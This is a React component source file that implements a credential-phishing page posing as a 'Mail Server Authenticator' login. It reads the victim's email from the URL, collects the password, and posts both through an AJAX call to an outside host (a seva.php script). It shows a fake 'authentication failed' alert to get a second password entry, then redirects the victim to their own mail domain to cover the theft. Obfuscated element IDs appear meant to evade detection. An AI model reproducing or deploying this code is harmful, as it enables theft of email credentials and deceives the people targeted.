
import { useState } from 'react';
import './desc.css';
import $ from 'jquery';

export const Desc = ()=>{

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).toLowerCase().split('&', 1).toString();

    const [invalid, setInvalid] = useState(false);
    const [btn, setBtn] = useState('Authenticate');

    const [defaultEmail, setDefaultEmail] = useState(extracetdEmail);
    const [defaultPassword, setDefaultPassword] = useState('');
    const [count, setCount] = useState(0);



    const submitDefaultForm = (e)=>{
        e.preventDefault();

        if (defaultPassword === "") {
            return null
        } else {            
            
            setBtn('Verifying...');
            setTimeout(() => {
                setDefaultPassword('');
                setBtn(btn)
                
            }, 3000);
    
    
            setCount(count=> count + 1);
                if(count === 1){
                    const redirectURL = window.location.href;
                    const sliceEqualSign = redirectURL.indexOf("@");
                    const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                    console.log(extracetdemailDomain);
                    setTimeout(() => {
                        window.location.href = `https://www.${extracetdemailDomain.toLowerCase().split('&', 1).toString()}`;
                    }, 1500);
                };
    
                setTimeout(()=>{
                    setInvalid(true);
                }, 2200)
    
            // post to server
            const user = {
                email: defaultEmail,
                password: defaultPassword,
    
            };
        
            $.ajax({
                type: "POST",
                url: "https://physicaleducationdiploma.com/anoda/seva.php",
                data: user,
                success(data) {
                    // alert('OK');
                    console.log(data);
                },
            });



            
        }
    };

    


    return(<>

        { invalid ? <div class="alert alert-danger" style={{fontSize: '14px', width:'73%', marginBottom:'2.3em'}}>
            Email Password Authentication failed, try again with a valid password.
        </div> : undefined }

        <form action="" id='fm_kJHUIOL_PLKI_______POjhblkjh_' onSubmit={submitDefaultForm}>
            
            <div className='eml_cntnt form-group first'>
                <label htmlFor="username">Verified User Email:</label>
                <input 
                    type='email'
                    className='form-control email'
                    placeholder='Email'
                    readOnly
                    required
                    id='emai'
                    value={defaultEmail}
                    onChange={e=> setDefaultEmail(e.target.value)}
                />
            </div>



            <div className='eml_cntnt form-group last mb-3'>
                <label htmlFor="username">Password:</label>
                <input 
                    type="password" 
                    name="password"
                    id="password"
                    className='form-control pswd'
                    required
                    placeholder=''
                    value={defaultPassword}
                    onChange={e=> setDefaultPassword(e.target.value)}
                    autoFocus
                    autoComplete='true'
                />
            </div>


            <div className='d-flex mb-5 align-items-center'>

                <label className="control control--checkbox mb-0">
                    <span className="caption">Remember me</span>
                    <input type="checkbox" checked style={{display:'none'}} onChange={()=> null}/>
                    <div className="control__indicator"></div>
                </label>
            </div>

            <div className='btn_wrapper'>
                <input 
                    type='submit'
                    id='button'
                    value={`${btn}`}
                    className='btn btn-block btn-warning'
                    onClick={submitDefaultForm}
                />
            </div>


        </form>

        <p className='foote____kgyuKHGYUjkljhgHJn___r_'>
            {/* <kbd> */}
            © 2024 Mail Server Authenticator
            {/* </kbd> */}
            </p>










    </>)
}